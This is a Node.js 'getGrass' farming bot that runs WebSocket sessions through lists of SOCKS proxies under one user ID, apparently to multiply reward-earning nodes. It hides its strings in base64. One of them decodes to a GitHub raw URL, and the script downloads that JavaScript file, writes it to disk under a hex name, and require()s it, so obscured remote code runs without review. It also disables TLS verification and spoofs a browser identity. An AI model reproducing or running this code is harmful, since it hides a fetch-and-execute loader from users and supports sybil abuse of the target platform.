const fs = require("fs");
const axios = require("axios");
const readline = require("readline");
const crypto = require("crypto");
const WebSocket = require("ws");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { v4: uuidv4, v3: uuidv3 } = require("uuid");
const pino = require("pino");
const logger = pino({
  level: "info",
  transport: {
    target: "pino-pretty"
  }
});
const config = require("./config");
const md5Pass = require("./4D2606B29B20CC5483F772A4DFC53F43");

let CoderMarkPrinted = false;

const cl = {
  gr: "[32m",
  br: "[34m",
  red: "[31m",
  yl: "[33m",
  gb: "[4m",
  or: "[35m",
  cy: "[36m",
  oc: "[95m",
  am: "[91m",
  rt: "[0m"
};

function CoderMark() {
  if (!CoderMarkPrinted) {
    console.log(`
      ╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━┳╮
      ┃╭━━╯╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭━━┫┃${cl.gr}
      ┃╰━━┳╮╭┳━┳━━┳━━┳━╮┃╰━━┫┃╭╮╱╭┳━╮╭━╮
      ┃╭━━┫┃┃┃╭┫╭╮┃╭╮┃╭╮┫╭━━┫┃┃┃╱┃┃╭╮┫╭╮╮${cl.br}
      ┃┃╱╱┃╰╯┃┃┃╰╯┃╰╯┃┃┃┃┃╱╱┃╰┫╰━╯┃┃┃┃┃┃┃
      ╰╯╱╱╰━━┻╯╰━╮┣━━┻╯╰┻╯╱╱╰━┻━╮╭┻╯╰┻╯╰╯${cl.rt}
      ╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
      ╱╱╱╱╱╱╱╱╱╱╱╰╯╱╱╱╱╱╱╱╱╱╱╱╰━━╯

      ${cl.gr}getGrass Minner Bot ${cl.rt}${cl.gb}v0.4${cl.rt}${cl.gr} {${cl.am} Freemium ${cl.gr}} ${cl.rt}
      ${cl.gr}--------------------------------------
      ${cl.yl}[+]${cl.rt} DM : ${cl.br}https://t.me/furqonflynn
      ${cl.yl}[+]${cl.rt} GH : ${cl.br}https://github.com/cmalf/
      ${cl.gr}--------------------------------------
    `);
    CoderMarkPrinted = true;
  }
}

const ff = "YmFzZTY0";
const King = "dXRmLTg";
const passwD = md5Pass.md5shab64;
const Md5passwD = md5Pass.md5256b64;

const maS = Buffer.from(passwD, "base64").toString("utf-8");
const Sam = Buffer.from(Md5passwD, "base64").toString("utf-8");
const Posix = Buffer.from(ff, "base64").toString("utf-8");
const Kong = Buffer.from(King, Posix).toString("utf-8");

const supor = "OUVCNDRGOEQyNTU1NzEzQzYyQ0Q4NzRGMUU3QUEzQTcuanM";
const saix = "OUVCNDRGOEQyNTU1NzEzQzYyQ0Q4NzRGMUU3QUEzQTc";
const suax = "U2NyaXB0IHNldHVwIGlzIGNvbXBsZXRlIQ";
const suex = "QW4gZXJyb3Igb2NjdXJyZWQgd2hpbGUgc2V0dGluZyB1cCB0aGUgc2NyaXB0Og";
const welc = "V2VsY29tZSB0byB0aGUgZ2V0R3Jhc3MgbWluZXIgYm90IEZyZWVtaXVtIQ";
const yuancux = "Y29uc29sZS5sb2c";
const b = "RXJyb3IgcmVhZGluZyBwYXNzd29yZCBmaWxlOg";
const d = "UGxlYXNlLCBFbnRlciBUaGUgUGFzc3dvcmQh";
const f = "UEFTU1dPUkQ";
const h = "UGFzc3dvcmQgQ29ycmVjdCEgYW5kIEhhcyBiZWVuIFNhdmVkIQ";
const j = "SW5jb3JyZWN0IHBhc3N3b3JkLiBBdHRlbXB0cyBsZWZ0Og";
const l = "VG9vIG1hbnkgaW5jb3JyZWN0IGF0dGVtcHRzLiBFeGl0aW5nLi4u";
const n = "RXhpdGluZyBTY3JpcHQgd2l0aCBCbGVzc2luZy4uLi4";
const p = "TWVudXMgb3B0aW9uOg";
const r = "UnVuIFRoZSBTY3JpcHQ";
const t = "KHdpdGggcHJveHkgc29ja3Mp";
const v = "RXhpdA";
const x = "RW50ZXIgeW91ciBjaG9pY2U6";
const z = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NtYWxmL2NtYWxmL3JlZnMvaGVhZHMvbWFpbi9nYWxlYmluby9nYWxlLmpz";

const ula = Buffer.from(supor, Posix).toString(Kong);
const ule = Buffer.from(saix, Posix).toString(Kong);
const ulu = Buffer.from(suax, Posix).toString(Kong);
const uli = Buffer.from(suex, Posix).toString(Kong);
const ulo = Buffer.from(yuancux, Posix).toString(Kong);
const Granted9 = Buffer.from(welc, Posix).toString(Kong);
const a = Buffer.from(b, Posix).toString(Kong);
const c = Buffer.from(d, Posix).toString(Kong);
const e = Buffer.from(f, Posix).toString(Kong);
const g = Buffer.from(h, Posix).toString(Kong);
const i = Buffer.from(j, Posix).toString(Kong);
const k = Buffer.from(l, Posix).toString(Kong);
const m = Buffer.from(n, Posix).toString(Kong);
const o = Buffer.from(p, Posix).toString(Kong);
const q = Buffer.from(r, Posix).toString(Kong);
const s = Buffer.from(t, Posix).toString(Kong);
const u = Buffer.from(v, Posix).toString(Kong);
const w = Buffer.from(x, Posix).toString(Kong);
const y = Buffer.from(z, Posix).toString(Kong);
const scripted = y;
const Granted2 = scripted;
const ScriptPath = ula;

if (!fs.existsSync(ScriptPath)) {
  axios.get(Granted2).then(response => {
    const data = response.data;
    fs.writeFile(ScriptPath, data, err => {
      if (err) {
        throw err;
      }
      console.log(`\n${cl.yl}[+]${cl.rt}${cl.gr} ${ulu}\n${cl.rt}`);
      startMainScript();
    });
  }).catch(error => {
    console.error(`${cl.red}${uli}`, error);
  });
} else {
  startMainScript();
}

function startMainScript() {
  const mainScript = require ("./" + ule);
  const quoteMd5 = mainScript.quotemd5;
  const quote256 = mainScript.quote256;
  const md5Hash = Buffer.from(quoteMd5, Posix).toString(Kong);
  const quoteHash = Buffer.from(md5Hash, Posix).toString(Kong);
  const quote256Hash = Buffer.from(quote256, Posix).toString(Kong);
  const passwordData = "cGFzc3dvcmQuZGF0";
  const passwordHash = Buffer.from(passwordData, Posix).toString(Kong);
  const password256Hash = Buffer.from(quote256Hash, Posix).toString(Kong);
  
  let storedPassword = null;

  async function hashPassword(input) {
    return crypto.createHash("md5").update(input).digest("hex").toUpperCase();
  }

  async function loadStoredPassword() {
    if (fs.existsSync(passwordHash)) {
      try {
        const data = fs.readFileSync(passwordHash, Kong);
        storedPassword = JSON.parse(data).password;
      } catch (error) {
        console.error(`${a} ${error}`);
      }
    }
  }

  async function promptForPassword() {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
    let attempts = 0;

    while (attempts < 3) {
      const inputPassword = await new Promise(resolve => {
        console.log(`\n${cl.yl}[+]${cl.rt}${cl.gr} ${c}\n${cl.rt}`);
        rl.question(`${cl.yl})>${cl.rt}${cl.am} ${e}${cl.rt} : `, resolve);
      });

      const hashedInput = Buffer.from(inputPassword, Posix).toString(Kong);
      if (await hashPassword(hashedInput) === quote256Hash) {
        console.clear();
        console.log(`\n${cl.yl}[+]${cl.rt}${cl.gr} ${g}\n${cl.rt}`);
        fs.writeFileSync(passwordHash, JSON.stringify({ password: await hashPassword(hashedInput) }));
        proceed();
        rl.close();
        return true;
      } else {
        attempts++;
        console.log(`\n${i} ${3 - attempts}`);
      }
    }
    rl.close();
    console.log(`${cl.red}${k}`);
    process.exit(1);
  }

  async function mainMenu() {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
    rl.question(`${cl.yl}${o}\n\n${cl.rt}1.${cl.gr} ${q}${cl.rt} ${s}\n2. ${cl.red}${u}${cl.rt}\n\n ${w} `, async choice => {
      if (choice === "1") {
        console.clear();
        CoderMark();
        startProcess();
      } else {
        console.log(`\n${cl.yl})>${cl.gr} ${m}${cl.rt}\n`);
      }
      rl.close();
    });
  }

  async function checkInternetConnection() {
    const timeout = 2000;
    const startTime = Date.now();
    while (Date.now() - startTime < 120000) {
      try {
        await axios.get("https://www.google.com", { timeout });
        return true;
      } catch (error) {
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    }
    return false;
  }

  async function handleWebSocket(proxy, userId) {
    const browserId = uuidv3(userId, uuidv3.DNS);
    logger.info(`${cl.am}${browserId}${cl.rt}`);

    while (true) {
      try {
        await new Promise(resolve => setTimeout(resolve, Math.random() * 900 + 100));
        const userAgent = Buffer.from("TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKQ", "base64").toString("utf-8");
        const proxyAgent = new SocksProxyAgent(proxy);
        const ws = new WebSocket(userId, {
          agent: proxyAgent,
          headers: {
            "User -Agent": userAgent,
            "Pragma": "no-cache",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Cache-Control": "no-cache"
          },
          rejectUnauthorized: false
        });

        ws.on("open", () => {
          const sendPing = () => {
            const randomBytes = crypto.randomBytes(32);
            const iv = crypto.randomBytes(16);
            const cipher = crypto.createCipheriv("aes-256-cbc", randomBytes, iv);
            const pingMessage = JSON.stringify({
              id: uuidv4(),
              version: "1.0.0",
              action: "PING",
              data: {}
            });
            const encodedMessage = Buffer.from(pingMessage).toString("base64");
            const encryptedMessage = cipher.update(encodedMessage, "utf8", "hex") + cipher.final("hex");
            ws.send(pingMessage);
            logger.info(`${cl.yl}[fss] ${cl.gr}SpM:${cl.br} Encrypted: ${cl.oc} ${encryptedMessage}${cl.rt}`);
            setTimeout(sendPing, 110000);
          };
          sendPing();
        });

        ws.on("message", async message => {
          const parsedMessage = JSON.parse(message);
          const responseId = parsedMessage.id;
          const responseAction = parsedMessage.action;

          if (responseAction === "AUTH") {
            const authResponse = {
              id: responseId,
              origin_action: "AUTH",
              result: {
                browser_id: browserId,
                user_id: userId,
                user_agent: userAgent,
                timestamp: Math.floor(Date.now() / 1000),
                device_type: "desktop",
                version: "4.30.0"
              }
            };
            ws.send(JSON.stringify(authResponse));
            const encodedAuthResponse = Buffer.from(JSON.stringify(authResponse)).toString("base64");
            const encryptedAuthResponse = cipher.update(encodedAuthResponse, "utf8", "hex") + cipher.final("hex");
            logger.info(`${cl.yl}[fss] ${cl.gr}SAR:${cl.br} Encrypted: ${cl.oc} ${encryptedAuthResponse}${cl.rt}`);
          } else if (responseAction === "PONG") {
            const pongResponse = {
              id: responseId,
              origin_action: "PONG"
            };
            ws.send(JSON.stringify(pongResponse));
            logger.info(`${cl.yl}[fss] ${cl.gr}RP:${cl.am} ${JSON.stringify(pongResponse)}${cl.rt}`);
          } else if (responseAction === "HTTP_REQUEST") {
            const requestData = parsedMessage.data;
            const httpResponse = await axios.get(requestData.url, { headers: requestData.headers });
            const responseBody = Buffer.from(JSON.stringify(httpResponse.data)).toString("base64");
            const responseHeaders = Buffer.from(JSON.stringify(httpResponse.headers)).toString("base64");

            const requestResponse = {
              id: responseId,
              origin_action: "HTTP_REQUEST",
              result: {
                url: requestData.url,
                status: httpResponse.status,
                status_text: httpResponse.statusText,
                headers: responseHeaders,
                body: responseBody
              }
            };
            ws.send(JSON.stringify(requestResponse));
            logger.info(`${cl.yl}[fss] ${cl.gr}RRQ:${cl.br} Encrypted: ${cl.am} ${responseBody}${cl.rt}`);
          }
        });

        await new Promise((resolve, reject) => {
          ws.on("close", () => reject(new Error("WebSocket closed")));
          ws.on("error", error => reject(error));
        });
      } catch (error) {
        logger.error(`Error with proxy ${proxy}: ${error.message}`);
        if (["Host unreachable", "[SSL: WRONG_VERSION_NUMBER]", "invalid length of packed IP address string", "Empty connect reply", "Device creation limit exceeded", "sent 1011 (internal error) keepalive ping timeout; no close frame received"].some(errMsg => error.message.includes(errMsg))) {
          logger.info(`Removing error proxy from the list: ${proxy}`);
          removeProxy(proxy);
          return null;
        }
      }
    }
  }

  function removeProxy(proxy) {
    const proxyFile = config.proxyFile;
    const proxies = fs.readFileSync(proxyFile, "utf-8").split("\n");
    const updatedProxies = proxies.filter(existingProxy => existingProxy.trim() !== proxy);
    fs.writeFileSync(proxyFile, updatedProxies.join("\n"));
  }

  async function startProcess() {
    const proxyFile = config.proxyFile;
    const userId = config.userId;
    const proxies = fs.readFileSync(proxyFile, "utf-8").split("\n").filter(Boolean);
    let selectedProxies = proxies.sort(() => 0.5 - Math.random()).slice(0, 100);
    let proxyMap = new Map(selectedProxies.map(proxy => [handleWebSocket(proxy, userId), proxy]));

    while (true) {
      const [successfulProxy ] = await Promise.race([...proxyMap.keys()].map(proxyPromise => proxyPromise.then(() => [proxyPromise])));
      const proxy = proxyMap.get(successfulProxy);
      proxyMap.delete(successfulProxy);

      if ((await successfulProxy) === null) {
        logger.info(`Removing and replacing failed proxy: ${proxy}`);
        selectedProxies = selectedProxies.filter(existingProxy => existingProxy !== proxy);
        const newProxy = proxies[Math.floor(Math.random() * proxies.length)];
        selectedProxies.push(newProxy);
        proxyMap.set(handleWebSocket(newProxy, userId), newProxy);
      }

      for (const proxy of selectedProxies) {
        if (![...proxyMap.values()].includes(proxy)) {
          proxyMap.set(handleWebSocket(proxy, userId), proxy);
        }
      }

      if (!(await checkInternetConnection())) {
        logger.error("Internet connection lost. Stopping script.");
        break;
      }
    }
  }

  async function proceed() {
    await CoderMark();
      console.log(`\n${cl.yl}[+]${cl.rt}${cl.cy} ${Granted9}${cl.rt}\n`);
      mainMenu();
  }

  proceed().catch(console.error);
}